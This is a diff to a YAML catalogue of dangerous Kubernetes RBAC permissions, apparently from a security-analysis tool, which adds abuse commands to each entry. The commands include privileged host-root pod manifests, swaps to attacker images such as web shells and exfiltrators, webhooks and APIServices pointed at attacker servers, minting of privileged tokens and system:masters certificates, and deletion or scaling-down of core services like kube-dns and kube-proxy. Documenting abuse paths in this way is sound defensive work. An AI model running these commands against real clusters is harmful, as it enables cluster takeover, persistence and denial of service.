+        apiVersion: apps/v1
+        kind: Deployment
+        metadata:
+          name: privileged-deployment
+        spec:
+          replicas: 1
+          selector:
+            matchLabels:
+              app: privileged-app
+          template:
+            metadata:
+              labels:
+                app: privileged-app
+            spec:
+              hostNetwork: true
+              hostPID: true
+              containers:
+              - name: attacker
+                image: busybox
+                command: ["/bin/sh", "-c", "sleep infinity"]
+                securityContext:
+                  privileged: true
+                volumeMounts:
+                - mountPath: /host
+                  name: host-root
+              volumes:
+              - name: host-root
+                hostPath:
+                  path: /
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Scale a critical deployment to zero replicas, causing denial of service."
+      command: |
+        kubectl scale deployment <deployment-name> -n <namespace> --replicas=0
+        # Example: kubectl scale deployment kube-dns -n kube-system --replicas=0
 - id: 1034
   name: "Manage Deployments in a namespace (potential for privileged pod execution)"
   description: "Grants permission to create, update, or delete Deployments within a specific namespace. This can be used to deploy pods with privileged settings within that namespace, potentially leading to privilege escalation, persistence, and tampering with applications."
@@ -461,6 +934,41 @@
       "Persistence",
       "Tampering",
     ]
+  commands:
+    - description: "Create a new Deployment with a hostPath mount in the namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: apps/v1
+        kind: Deployment
+        metadata:
+          name: hostpath-deployment
+        spec:
+          replicas: 1
+          selector:
+            matchLabels:
+              app: hostpath-app
+          template:
+            metadata:
+              labels:
+                app: hostpath-app
+            spec:
+              containers:
+              - name: hostpath-container
+                image: busybox
+                command: ["/bin/sh", "-c", "sleep infinity"]
+                volumeMounts:
+                - mountPath: /host-etc
+                  name: host-etc
+              volumes:
+              - name: host-etc
+                hostPath:
+                  path: /etc
+        EOF
+        # Example: kubectl create -n development -f - <<EOF ... EOF
+    - description: "Update an existing Deployment's image to a malicious one."
+      command: |
+        kubectl set image deployment/<deployment-name> <container-name>=<malicious-image> -n <namespace>
+        # Example: kubectl set image deployment/my-web-app web=attacker/web-shell -n default
 - id: 1035
   name: "Manage DaemonSets cluster-wide (runs on all nodes, high impact)"
   description: "Permits creating, updating, or deleting DaemonSets across the cluster. DaemonSets ensure a pod runs on all (or selected) nodes. This is highly critical as it allows deploying privileged pods directly onto every node, leading to widespread node compromise, privilege escalation, and persistent access."
@@ -478,6 +986,44 @@
       "NodeAccess",
       "Tampering",
     ]
+  commands:
+    - description: "Create a new DaemonSet that deploys a privileged pod on every node."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: apps/v1
+        kind: DaemonSet
+        metadata:
+          name: privileged-daemonset
+        spec:
+          selector:
+            matchLabels:
+              app: privileged-ds
+          template:
+            metadata:
+              labels:
+                app: privileged-ds
+            spec:
+              hostNetwork: true
+              hostPID: true
+              containers:
+              - name: attacker
+                image: busybox
+                command: ["/bin/sh", "-c", "sleep infinity"]
+                securityContext:
+                  privileged: true
+                volumeMounts:
+                - mountPath: /host
+                  name: host-root
+              volumes:
+              - name: host-root
+                hostPath:
+                  path: /
+        EOF
+        # Example: kubectl create -n kube-system -f - <<EOF ... EOF
+    - description: "Delete a critical DaemonSet, disrupting cluster-wide services."
+      command: |
+        kubectl delete daemonset <daemonset-name> -n <namespace>
+        # Example: kubectl delete daemonset kube-proxy -n kube-system
 - id: 1036
   name: "Manage DaemonSets in a namespace (runs on nodes, high impact)"
   description: "Allows creating, updating, or deleting DaemonSets within a specific namespace. Even if namespaced, DaemonSets can be configured to run on multiple nodes, and if they deploy privileged pods, this can lead to node compromise, privilege escalation, and persistence."
@@ -495,6 +1041,40 @@
       "NodeAccess",
       "Tampering",
     ]
+  commands:
+    - description: "Create a new DaemonSet with hostPath access in the namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: apps/v1
+        kind: DaemonSet
+        metadata:
+          name: hostpath-daemonset
+        spec:
+          selector:
+            matchLabels:
+              app: hostpath-ds
+          template:
+            metadata:
+              labels:
+                app: hostpath-ds
+            spec:
+              containers:
+              - name: hostpath-container
+                image: busybox
+                command: ["/bin/sh", "-c", "sleep infinity"]
+                volumeMounts:
+                - mountPath: /host-etc
+                  name: host-etc
+              volumes:
+              - name: host-etc
+                hostPath:
+                  path: /etc
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Update an existing DaemonSet's image to a malicious one."
+      command: |
+        kubectl set image daemonset/<daemonset-name> <container-name>=<malicious-image> -n <namespace>
+        # Example: kubectl set image daemonset/my-logging-agent agent=attacker/log-exfiltrator -n monitoring
 - id: 1037
   name: "Manage StatefulSets cluster-wide"
   description: "Grants permission to create, update, or delete StatefulSets across all namespaces. Similar to Deployments, this can be used to deploy pods (often stateful applications) with privileged configurations, leading to privilege escalation, persistence, and tampering."
@@ -505,6 +1085,37 @@
   resources: ["statefulsets"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["WorkloadLifecycle", "PrivilegeEscalation", "Persistence", "Tampering"]
+  commands:
+    - description: "Create a new StatefulSet with a privileged pod template."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: apps/v1
+        kind: StatefulSet
+        metadata:
+          name: privileged-statefulset
+        spec:
+          serviceName: "privileged-service"
+          replicas: 1
+          selector:
+            matchLabels:
+              app: privileged-sts
+          template:
+            metadata:
+              labels:
+                app: privileged-sts
+            spec:
+              containers:
+              - name: attacker
+                image: busybox
+                command: ["/bin/sh", "-c", "sleep infinity"]
+                securityContext:
+                  privileged: true
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Scale a critical StatefulSet to zero replicas, causing data inconsistency or DoS."
+      command: |
+        kubectl scale statefulset <statefulset-name> -n <namespace> --replicas=0
+        # Example: kubectl scale statefulset my-database -n production --replicas=0
 - id: 1038
   name: "Manage StatefulSets in a namespace"
   description: "Allows creating, updating, or deleting StatefulSets within a specific namespace. This can be used to deploy stateful applications with potentially privileged settings, leading to potential privilege escalation, persistence, and tampering within that namespace."
@@ -521,6 +1132,42 @@
       "Persistence",
       "Tampering",
     ]
+  commands:
+    - description: "Create a new StatefulSet with a hostPath mount in the namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: apps/v1
+        kind: StatefulSet
+        metadata:
+          name: hostpath-statefulset
+        spec:
+          serviceName: "hostpath-service"
+          replicas: 1
+          selector:
+            matchLabels:
+              app: hostpath-sts
+          template:
+            metadata:
+              labels:
+                app: hostpath-sts
+            spec:
+              containers:
+              - name: hostpath-container
+                image: busybox
+                command: ["/bin/sh", "-c", "sleep infinity"]
+                volumeMounts:
+                - mountPath: /host-var
+                  name: host-var
+              volumes:
+              - name: host-var
+                hostPath:
+                  path: /var
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Update an existing StatefulSet's image to a malicious one."
+      command: |
+        kubectl set image statefulset/<statefulset-name> <container-name>=<malicious-image> -n <namespace>
+        # Example: kubectl set image statefulset/my-app-db db=attacker/db-backdoor -n production
 - id: 1039
   name: "Manage CronJobs cluster-wide (scheduled privileged execution, persistence)"
   description: "Permits creating, updating, or deleting CronJobs across all namespaces. CronJobs schedule recurring batch jobs. This is critical as it allows scheduling the execution of pods (potentially privileged) at regular intervals, leading to privilege escalation, persistent access, and tampering."
@@ -531,6 +1178,42 @@
   resources: ["cronjobs"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["WorkloadLifecycle", "PrivilegeEscalation", "Persistence", "Tampering"]
+  commands:
+    - description: "Create a new CronJob that schedules a privileged pod to run periodically."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: batch/v1
+        kind: CronJob
+        metadata:
+          name: privileged-cronjob
+        spec:
+          schedule: "*/1 * * * *" # Every minute
+          jobTemplate:
+            spec:
+              template:
+                spec:
+                  hostNetwork: true
+                  hostPID: true
+                  containers:
+                  - name: attacker
+                    image: busybox
+                    command: ["/bin/sh", "-c", "echo 'Pwned!' > /host/pwned.txt"]
+                    securityContext:
+                      privileged: true
+                    volumeMounts:
+                    - mountPath: /host
+                      name: host-root
+                  volumes:
+                  - name: host-root
+                    hostPath:
+                      path: /
+                  restartPolicy: OnFailure
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Suspend a critical CronJob, preventing scheduled tasks from running (DoS)."
+      command: |
+        kubectl patch cronjob <cronjob-name> -n <namespace> -p '{"spec" : {"suspend" : true}}'
+        # Example: kubectl patch cronjob backup-db -n production -p '{"spec" : {"suspend" : true}}'
 - id: 1040
   name: "Manage CronJobs in a namespace (scheduled privileged execution, persistence)"
   description: "Grants permission to create, update, or delete CronJobs within a specific namespace. This can be used to schedule the execution of potentially privileged pods, enabling privilege escalation, persistence, and tampering within that namespace."
@@ -547,6 +1230,38 @@
       "Persistence",
       "Tampering",
     ]
+  commands:
+    - description: "Create a new CronJob with a hostPath mount in the namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: batch/v1
+        kind: CronJob
+        metadata:
+          name: hostpath-cronjob
+        spec:
+          schedule: "*/5 * * * *" # Every 5 minutes
+          jobTemplate:
+            spec:
+              template:
+                spec:
+                  containers:
+                  - name: hostpath-container
+                    image: busybox
+                    command: ["/bin/sh", "-c", "echo 'Hello from cronjob' >> /host-var/log/cron.log"]
+                    volumeMounts:
+                    - mountPath: /host-var
+                      name: host-var
+                  volumes:
+                  - name: host-var
+                    hostPath:
+                      path: /var
+                  restartPolicy: OnFailure
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Update an existing CronJob's image to a malicious one."
+      command: |
+        kubectl patch cronjob <cronjob-name> -n <namespace> --type='json' -p='[{"op": "replace", "path": "/spec/jobTemplate/spec/template/spec/containers/0/image", "value": "attacker/malicious-job"}]'
+        # Example: kubectl patch cronjob data-sync -n production --type='json' -p='[{"op": "replace", "path": "/spec/jobTemplate/spec/template/spec/containers/0/image", "value": "attacker/data-exfiltrator"}]'
 - id: 1041
   name: "Manage Jobs cluster-wide (one-off privileged execution)"
   description: "Allows creating, updating, or deleting Jobs across all namespaces. Jobs create one or more pods for batch tasks. This can be used to run a one-off pod with privileged settings, leading to code execution, privilege escalation, and tampering."
@@ -557,6 +1272,39 @@
   resources: ["jobs"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["WorkloadLifecycle", "PrivilegeEscalation", "Tampering"]
+  commands:
+    - description: "Create a new Job that runs a privileged pod once."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: batch/v1
+        kind: Job
+        metadata:
+          name: privileged-job
+        spec:
+          template:
+            spec:
+              hostNetwork: true
+              hostPID: true
+              containers:
+              - name: attacker
+                image: busybox
+                command: ["/bin/sh", "-c", "echo 'Job Pwned!' > /host/job_pwned.txt"]
+                securityContext:
+                  privileged: true
+                volumeMounts:
+                - mountPath: /host
+                  name: host-root
+              volumes:
+              - name: host-root
+                hostPath:
+                  path: /
+              restartPolicy: OnFailure
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Delete a critical Job, preventing a one-off task from completing."
+      command: |
+        kubectl delete job <job-name> -n <namespace>
+        # Example: kubectl delete job db-migration-job -n production
 - id: 1042
   name: "Manage Jobs in a namespace (one-off privileged execution)"
   description: "Permits creating, updating, or deleting Jobs within a specific namespace. This can be used to run a one-off pod, potentially with privileged settings, leading to code execution and potential privilege escalation within that namespace."
@@ -567,8 +1315,35 @@
   resources: ["jobs"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["WorkloadLifecycle", "PotentialPrivilegeEscalation", "Tampering"]
-
-# --- Admission Control (admissionregistration.k8s.io/v1) ---
+  commands:
+    - description: "Create a new Job with a hostPath mount in the namespace."
+      command: |
+        kubectl create -n <namespace> -f - <<EOF
+        apiVersion: batch/v1
+        kind: Job
+        metadata:
+          name: hostpath-job
+        spec:
+          template:
+            spec:
+              containers:
+              - name: hostpath-container
+                image: busybox
+                command: ["/bin/sh", "-c", "echo 'Hello from job' >> /host-tmp/job.log"]
+                volumeMounts:
+                - mountPath: /host-tmp
+                  name: host-tmp
+              volumes:
+              - name: host-tmp
+                hostPath:
+                  path: /tmp
+              restartPolicy: OnFailure
+        EOF
+        # Example: kubectl create -n default -f - <<EOF ... EOF
+    - description: "Update an existing Job's image to a malicious one."
+      command: |
+        kubectl patch job <job-name> -n <namespace> --type='json' -p='[{"op": "replace", "path": "/spec/template/spec/containers/0/image", "value": "attacker/malicious-script"}]'
+        # Example: kubectl patch job cleanup-old-data -n production --type='json' -p='[{"op": "replace", "path": "/spec/template/spec/containers/0/image", "value": "attacker/data-wipe"}]'
 - id: 1043
   name: "Manage MutatingWebhookConfigurations"
   description: "Grants control over MutatingWebhookConfigurations, which can modify API objects during admission. This is extremely critical as an attacker can create or alter webhooks to inject malicious configurations, escalate privileges, bypass security policies, or cause denial of service."
@@ -585,6 +1360,33 @@
       "PrivilegeEscalation",
       "DenialOfService",
     ]
+  commands:
+    - description: "Create a new MutatingWebhookConfiguration to inject privileged containers into pods."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: admissionregistration.k8s.io/v1
+        kind: MutatingWebhookConfiguration
+        metadata:
+          name: privileged-injector
+        webhooks:
+        - name: privileged-injector.example.com
+          clientConfig:
+            url: "https://<malicious-webhook-server>/mutate" # Attacker-controlled server
+            caBundle: <base64-encoded-ca-cert> # Self-signed CA for attacker's server
+          rules:
+          - operations: ["CREATE"]
+            apiGroups: [""]
+            apiVersions: ["v1"]
+            resources: ["pods"]
+          admissionReviewVersions: ["v1", "v1beta1"]
+          sideEffects: None
+          failurePolicy: Ignore # To avoid breaking legitimate operations
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete a critical MutatingWebhookConfiguration, potentially bypassing security policies."
+      command: |
+        kubectl delete mutatingwebhookconfiguration <webhook-name>
+        # Example: kubectl delete mutatingwebhookconfiguration pod-defaults-webhook
 - id: 1044
   name: "Manage ValidatingWebhookConfigurations"
   description: "Allows control over ValidatingWebhookConfigurations, which can validate or reject API objects during admission. An attacker can use this to tamper with security policies (e.g., disable a validating webhook that enforces security best practices) or cause denial of service by rejecting legitimate requests."
@@ -595,8 +1397,33 @@
   resources: ["validatingwebhookconfigurations"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["WebhookManipulation", "Tampering", "DenialOfService"] # Less direct EoP than mutating, but can still be abused.
-
-# --- API Extensions (apiextensions.k8s.io/v1, apiregistration.k8s.io/v1) ---
+  commands:
+    - description: "Delete a ValidatingWebhookConfiguration that enforces security policies."
+      command: |
+        kubectl delete validatingwebhookconfiguration <webhook-name>
+        # Example: kubectl delete validatingwebhookconfiguration pod-security-policy-webhook
+    - description: "Create a ValidatingWebhookConfiguration to block legitimate resource creation (DoS)."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: admissionregistration.k8s.io/v1
+        kind: ValidatingWebhookConfiguration
+        metadata:
+          name: deny-all-pods
+        webhooks:
+        - name: deny-all-pods.example.com
+          clientConfig:
+            url: "https://<malicious-webhook-server>/validate" # Attacker-controlled server that always denies
+            caBundle: <base64-encoded-ca-cert>
+          rules:
+          - operations: ["CREATE"]
+            apiGroups: [""]
+            apiVersions: ["v1"]
+            resources: ["pods"]
+          admissionReviewVersions: ["v1", "v1beta1"]
+          sideEffects: None
+          failurePolicy: Fail # Crucial for DoS
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
 - id: 1045
   name: "Manage CustomResourceDefinitions"
   description: "Permits creating, updating, or deleting CustomResourceDefinitions (CRDs). CRDs extend the Kubernetes API. Modifying CRDs can lead to tampering with custom controllers, potentially causing unexpected behavior, privilege escalation if controllers manage sensitive resources, or denial of service."
@@ -607,6 +1434,39 @@
   resources: ["customresourcedefinitions"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["CRDManipulation", "Tampering", "PotentialPrivilegeEscalation"]
+  commands:
+    - description: "Create a new CustomResourceDefinition for a malicious custom resource."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: apiextensions.k8s.io/v1
+        kind: CustomResourceDefinition
+        metadata:
+          name: maliciousconfigs.attacker.com
+        spec:
+          group: attacker.com
+          versions:
+            - name: v1
+              served: true
+              storage: true
+              schema:
+                openAPIV3Schema:
+                  type: object
+                  properties:
+                    spec:
+                      type: object
+                      x-kubernetes-preserve-unknown-fields: true
+          scope: Namespaced
+          names:
+            plural: maliciousconfigs
+            singular: maliciousconfig
+            kind: MaliciousConfig
+            shortNames: ["mc"]
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete an existing CustomResourceDefinition, disrupting custom controllers."
+      command: |
+        kubectl delete crd <crd-name>
+        # Example: kubectl delete crd applications.argoproj.io
 - id: 1046
   name: "Manage APIServices"
   description: "Grants control over APIServices, which register aggregated API servers. This is highly critical as an attacker can redirect API requests to a malicious server, intercept traffic, escalate privileges, cause denial of service, or exfiltrate information."
@@ -624,8 +1484,29 @@
       "DenialOfService",
       "InformationDisclosure",
     ]
-
-# --- Authentication & Authorization (authentication.k8s.io/v1, authorization.k8s.io/v1) ---
+  commands:
+    - description: "Create a new APIService to redirect API calls to a malicious server."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: apiregistration.k8s.io/v1
+        kind: APIService
+        metadata:
+          name: v1alpha1.attacker.com
+        spec:
+          service:
+            name: <malicious-service-name>
+            namespace: <malicious-service-namespace>
+          group: attacker.com
+          version: v1alpha1
+          caBundle: <base64-encoded-ca-cert> # CA for the malicious service
+          groupPriorityMinimum: 2000 # Higher than core APIs
+          versionPriority: 200
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete an existing APIService, disrupting aggregated API functionality."
+      command: |
+        kubectl delete apiservice <apiservice-name>
+        # Example: kubectl delete apiservice v1beta1.metrics.k8s.io
 - id: 1047
   name: "Create ServiceAccount Tokens"
   description: "Allows creating tokens for ServiceAccounts within a specific namespace. If a ServiceAccount has powerful permissions, creating a token for it allows impersonating that ServiceAccount, leading to potential privilege escalation, credential access, and spoofing."
@@ -643,6 +1524,15 @@
       "PotentialPrivilegeEscalation",
       "Spoofing",
     ]
+  commands:
+    - description: "Create a new service account token for a specific service account."
+      command: |
+        kubectl create token <serviceaccount-name> -n <namespace>
+        # Example: kubectl create token default -n default
+    - description: "Create a new service account token with a specific expiration time."
+      command: |
+        kubectl create token <serviceaccount-name> -n <namespace> --duration=1h
+        # Example: kubectl create token my-app-sa -n production --duration=24h
 - id: 1048
   name: "Create ServiceAccount Tokens (ClusterRole for any SA in any namespace)"
   description: "Permits creating tokens for any ServiceAccount in any namespace. This is highly critical as it allows an attacker to generate tokens for highly privileged ServiceAccounts (e.g., those bound to cluster-admin), leading to impersonation, credential access, and full privilege escalation."
@@ -660,6 +1550,14 @@
       "PrivilegeEscalation",
       "Spoofing",
     ]
+  commands:
+    - description: "Create a new service account token for any service account in any namespace."
+      command: |
+        kubectl create token <serviceaccount-name> -n <namespace>
+        # Example: kubectl create token default -n kube-system
+    - description: "Create a new service account token for a privileged service account (e.g., 'kube-controller-manager')."
+      command: |
+        kubectl create token kube-controller-manager -n kube-system
 - id: 1049
   name: "Create TokenReviews (validate arbitrary tokens)"
   description: "Allows submitting TokenReview requests to the API server to validate arbitrary tokens. This can be used to probe the validity and attributes of tokens, potentially discovering active service account tokens or user tokens, leading to information disclosure about authentication."
@@ -670,6 +1568,16 @@
   resources: ["tokenreviews"]
   verbs: ["create"]
   tags: ["InformationDisclosure", "CredentialAccess", "RBACQuery"]
+  commands:
+    - description: "Submit a TokenReview to validate an arbitrary token and get its user info."
+      command: |
+        # Replace <kubernetes-api-server> with your API server address (e.g., from 'kubectl cluster-info')
+        # Replace <your-token> with your current authentication token
+        # Replace <token-to-review> with the token you want to validate
+        curl -k -H "Authorization: Bearer <your-token>" -H "Content-Type: application/json" -X POST \
+          --data '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenReview","spec":{"token":"<token-to-review>"}}' \
+          https://<kubernetes-api-server>/apis/authentication.k8s.io/v1/tokenreviews
+        # Example: curl -k -H "Authorization: Bearer $(cat ~/.kube/config | grep token: | awk '{print $2}')" -H "Content-Type: application/json" -X POST --data '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenReview","spec":{"token":"eyJhbGciOiJSUzI..."}}' https://127.0.0.1:6443/apis/authentication.k8s.io/v1/tokenreviews
 - id: 1050
   name: "Create SubjectAccessReviews (check arbitrary permissions)"
   description: "Permits submitting SubjectAccessReview requests to check if an arbitrary user, group, or service account has specific permissions cluster-wide. This can be used for reconnaissance to understand the RBAC configuration and identify potential privilege escalation paths."
@@ -680,6 +1588,15 @@
   resources: ["subjectaccessreviews"]
   verbs: ["create"]
   tags: ["InformationDisclosure", "RBACQuery"]
+  commands:
+    - description: "Check if a specific service account can create pods in any namespace."
+      command: |
+        kubectl auth can-i create pods --as=system:serviceaccount:<namespace>:<serviceaccount-name> --all-namespaces
+        # Example: kubectl auth can-i create pods --as=system:serviceaccount:kube-system:default --all-namespaces
+    - description: "Check if a specific user can delete nodes."
+      command: |
+        kubectl auth can-i delete nodes --as=user:<username>
+        # Example: kubectl auth can-i delete nodes --as=admin
 - id: 1051
   name: "Create LocalSubjectAccessReviews (check permissions in a namespace)"
   description: "Allows submitting LocalSubjectAccessReview requests to check if an arbitrary user, group, or service account has specific permissions within a particular namespace. This aids in reconnaissance of RBAC permissions within a limited scope."
@@ -690,8 +1607,15 @@
   resources: ["localsubjectaccessreviews"]
   verbs: ["create"]
   tags: ["InformationDisclosure", "RBACQuery"]
-
-# --- Certificates (certificates.k8s.io/v1) ---
+  commands:
+    - description: "Check if a specific service account can get secrets in a given namespace."
+      command: |
+        kubectl auth can-i get secrets -n <namespace> --as=system:serviceaccount:<namespace>:<serviceaccount-name>
+        # Example: kubectl auth can-i get secrets -n production --as=system:serviceaccount:production:my-app-sa
+    - description: "Check if a specific user can update deployments in a given namespace."
+      command: |
+        kubectl auth can-i update deployments -n <namespace> --as=user:<username>
+        # Example: kubectl auth can-i update deployments -n default --as=dev-user
 - id: 1052
   name: "Approve CertificateSigningRequests"
   description: "Grants the ability to approve CertificateSigningRequests (CSRs). This is extremely critical as approving a CSR for a user or group with high privileges (e.g., system:masters group) allows an attacker to mint a client certificate that grants them those privileges, leading to full cluster compromise."
@@ -702,6 +1626,11 @@
   resources: ["certificatesigningrequests/approval"]
   verbs: ["update", "patch"] # "get" to view, "update/patch" to approve
   tags: ["CSRApproval", "PrivilegeEscalation", "Spoofing", "ClusterAdminAccess"]
+  commands:
+    - description: "Approve a pending CertificateSigningRequest."
+      command: |
+        kubectl certificate approve <csr-name>
+        # Example: kubectl certificate approve my-user-csr
 - id: 1053
   name: "Create CertificateSigningRequests"
   description: "Allows creating CertificateSigningRequests. While creating a CSR itself isn't immediately dangerous, if an overly permissive or automated signer approves it, it can lead to the issuance of a certificate with unintended privileges, facilitating spoofing or potential privilege escalation."
@@ -712,6 +1641,15 @@
   resources: ["certificatesigningrequests"]
   verbs: ["create"]
   tags: ["CSRCreation", "PotentialPrivilegeEscalation", "Spoofing"]
+  commands:
+    - description: "Create a CertificateSigningRequest for a new user or group."
+      command: |
+        # Generate a private key and CSR
+        openssl genrsa -out user.key 2048
+        openssl req -new -key user.key -out user.csr -subj "/CN=<username>/O=<group>"
+        # Create the CSR object in Kubernetes
+        kubectl certificate create <csr-name> --csr=user.csr --request-name=<request-name>
+        # Example: openssl genrsa -out admin.key 2048 && openssl req -new -key admin.key -out admin.csr -subj "/CN=admin/O=system:masters" && kubectl certificate create admin-csr --csr=admin.csr --request-name=admin-request
 - id: 1054
   name: "Manage (get, list, watch, delete) CertificateSigningRequests"
   description: "Permits viewing, listing, watching, or deleting CertificateSigningRequests. Viewing CSRs can disclose information about pending certificate requests. Deleting CSRs can cause denial of service by preventing legitimate certificates from being issued or renewed."
@@ -722,8 +1660,14 @@
   resources: ["certificatesigningrequests"]
   verbs: ["get", "list", "watch", "delete"]
   tags: ["InformationDisclosure", "Tampering", "DenialOfService"]
-
-# --- Storage (storage.k8s.io/v1) ---
+  commands:
+    - description: "List all CertificateSigningRequests."
+      command: |
+        kubectl get csr
+    - description: "Delete a specific CertificateSigningRequest, preventing certificate issuance."
+      command: |
+        kubectl delete csr <csr-name>
+        # Example: kubectl delete csr my-app-csr
 - id: 1055
   name: "Manage CSIDrivers (potential node compromise)"
   description: "Allows creating, updating, or deleting CSIDrivers. CSIDrivers define how container orchestrators interact with storage systems. A malicious CSIDriver could potentially compromise nodes by running privileged operations or exfiltrating data, leading to privilege escalation and node access."
@@ -735,6 +1679,25 @@
   verbs: ["create", "update", "patch", "delete"]
   tags:
     ["StorageManipulation", "Tampering", "PrivilegeEscalation", "NodeAccess"]
+  commands:
+    - description: "Create a new CSIDriver that could be used for malicious purposes."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: storage.k8s.io/v1
+        kind: CSIDriver
+        metadata:
+          name: malicious.csi.example.com
+        spec:
+          attachRequired: false
+          podInfoOnMount: false
+          volumeLifecycleModes:
+            - Persistent
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete an existing CSIDriver, disrupting storage operations."
+      command: |
+        kubectl delete csidriver <csidriver-name>
+        # Example: kubectl delete csidriver ebs.csi.aws.com
 - id: 1056
   name: "Manage StorageClasses"
   description: "Grants permission to create, update, or delete StorageClasses. StorageClasses define how dynamic provisioning of persistent volumes occurs. Tampering with StorageClasses can lead to denial of service (e.g., by making storage provisioning fail) or misconfiguration of storage resources."
@@ -745,8 +1708,23 @@
   resources: ["storageclasses"]
   verbs: ["create", "update", "patch", "delete"]
   tags: ["StorageManipulation", "Tampering", "DenialOfService"]
-
-# --- Policy (policy/v1) ---
+  commands:
+    - description: "Create a new StorageClass that points to a non-existent or malicious provisioner."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: storage.k8s.io/v1
+        kind: StorageClass
+        metadata:
+          name: malicious-storage
+        provisioner: non-existent.provisioner.example.com
+        reclaimPolicy: Delete
+        volumeBindingMode: Immediate
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete an existing StorageClass, preventing new volume provisioning."
+      command: |
+        kubectl delete storageclass <storageclass-name>
+        # Example: kubectl delete storageclass standard
 - id: 1057
   name: "Evict Pods cluster-wide"
   description: "Permits evicting (deleting) pods across all namespaces using the eviction API. This can be used to cause denial of service by disrupting running applications throughout the cluster."
@@ -757,6 +1735,19 @@
   resources: ["pods/eviction"]
   verbs: ["create"]
   tags: ["DenialOfService", "WorkloadLifecycle"]
+  commands:
+    - description: "Evict all pods from a specific node, causing disruption."
+      command: |
+        kubectl drain <node-name> --ignore-daemonsets --delete-emptydir-data
+        # Example: kubectl drain minikube --ignore-daemonsets --delete-emptydir-data
+    - description: "Evict a specific pod by directly calling the eviction API."
+      command: |
+        # Replace <kubernetes-api-server> with your API server address
+        # Replace <token> with your authentication token
+        curl -k -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -X POST \
+          --data '{"apiVersion":"policy/v1","kind":"Eviction","metadata":{"name":"<pod-name>","namespace":"<namespace>"}}' \
+          https://<kubernetes-api-server>/api/v1/namespaces/<namespace>/pods/<pod-name>/eviction
+        # Example: curl -k -H "Authorization: Bearer $(cat ~/.kube/config | grep token: | awk '{print $2}')" -H "Content-Type: application/json" -X POST --data '{"apiVersion":"policy/v1","kind":"Eviction","metadata":{"name":"my-app-pod-xyz","namespace":"default"}}' https://127.0.0.1:6443/api/v1/namespaces/default/pods/my-app-pod-xyz/eviction
 - id: 1058
   name: "Evict Pods in a namespace"
   description: "Allows evicting (deleting) pods within a specific namespace using the eviction API. This can disrupt applications running in that namespace, leading to a localized denial of service."
@@ -767,8 +1758,15 @@
   resources: ["pods/eviction"]
   verbs: ["create"]
   tags: ["DenialOfService", "WorkloadLifecycle"]
-
-# --- Node related (node.k8s.io/v1) ---
+  commands:
+    - description: "Evict a specific pod within the namespace by directly calling the eviction API."
+      command: |
+        # Replace <kubernetes-api-server> with your API server address
+        # Replace <token> with your authentication token
+        curl -k -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -X POST \
+          --data '{"apiVersion":"policy/v1","kind":"Eviction","metadata":{"name":"<pod-name>","namespace":"<namespace>"}}' \
+          https://<kubernetes-api-server>/api/v1/namespaces/<namespace>/pods/<pod-name>/eviction
+        # Example: curl -k -H "Authorization: Bearer $(cat ~/.kube/config | grep token: | awk '{print $2}')" -H "Content-Type: application/json" --data '{"apiVersion":"policy/v1","kind":"Eviction","metadata":{"name":"my-app-pod-xyz","namespace":"production"}}' https://127.0.0.1:6443/api/v1/namespaces/production/pods/my-app-pod-xyz/eviction
 - id: 1059
   name: "Manage RuntimeClasses"
   description: "Grants control over RuntimeClasses, which define different container runtime configurations. A malicious RuntimeClass could specify a compromised runtime or allow for escape to the underlying node, leading to node access, tampering, and privilege escalation."
@@ -785,8 +1783,21 @@
       "PrivilegeEscalation",
       "PotentialPrivilegeEscalation",
     ]
-
-# --- Wildcard Permissions ---
+  commands:
+    - description: "Create a new RuntimeClass pointing to a malicious or non-existent handler."
+      command: |
+        kubectl create -f - <<EOF
+        apiVersion: node.k8s.io/v1
+        kind: RuntimeClass
+        metadata:
+          name: malicious-runtime
+        handler: malicious-handler
+        EOF
+        # Example: kubectl create -f - <<EOF ... EOF
+    - description: "Delete an existing RuntimeClass, potentially disrupting workloads using it."
+      command: |
+        kubectl delete runtimeclass <runtimeclass-name>
+        # Example: kubectl delete runtimeclass kata
 - id: 1060
   name: "Wildcard permission on all resources cluster-wide (Cluster Admin)"
   description: "Grants unrestricted, wildcard ('*') access to all API groups, resources, and verbs across the entire cluster. This is equivalent to full cluster administrator privileges, allowing complete control and compromise of the Kubernetes cluster."
